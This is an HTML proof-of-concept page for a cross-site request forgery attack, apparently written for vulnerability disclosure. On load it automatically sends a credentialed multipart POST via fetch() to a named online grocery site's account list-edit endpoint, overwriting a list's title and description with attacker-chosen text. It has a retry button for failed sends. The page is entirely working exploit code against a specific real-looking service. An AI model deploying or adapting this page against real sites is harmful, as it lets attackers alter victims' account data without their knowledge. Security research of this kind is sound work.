<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>CSRF PoC Auto Submit</title>
</head>
<body>
  <h1>CSRF PoC using multipart/form-data (Auto Submit)</h1>

  <p id="status">Sending request...</p>

  <button id="retryBtn" style="display:none;">Retry Submit</button>

  <script>
    const status = document.getElementById('status');
    const retryBtn = document.getElementById('retryBtn');

    // Prepare the form data
    function createFormData() {
      const fd = new FormData();
      fd.append('title', 'CSRF Attack');
      fd.append('description', 'This was changed via CSRF PoC using multipart/form-data');
      return fd;
    }

    // Function to send the POST request
    function sendRequest() {
      status.textContent = 'Sending request...';
      retryBtn.style.display = 'none';

      fetch('https://www.mathem.se/se/account/lists/edit/', {
        method: 'POST',
        credentials: 'include',
        body: createFormData()
      })
      .then(response => {
        status.textContent = 'Response status: ' + response.status;
        return response.text();
      })
      .then(text => {
        console.log('Response body:', text);
      })
      .catch(error => {
        status.textContent = 'Error: ' + error;
        console.error('Fetch error:', error);
        retryBtn.style.display = 'inline-block';
      });
    }

    // Send request automatically when page loads
    window.onload = sendRequest;

    // Retry button handler
    retryBtn.addEventListener('click', sendRequest);
  </script>
</body>
</html>
